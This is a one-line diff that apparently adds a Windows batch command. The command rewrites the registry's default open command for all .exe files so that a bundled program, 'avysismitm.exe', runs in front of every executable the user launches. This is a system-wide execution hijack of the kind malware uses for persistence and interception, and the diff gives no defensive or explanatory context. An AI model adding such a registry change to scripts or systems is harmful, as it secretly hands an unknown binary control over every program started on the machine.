@@ -1,0 +1,1 @@
+reg add HKCR\exefile\shell\open\command /ve /d "%~dp0avysismitm.exe \"%%1\" %%*" /f
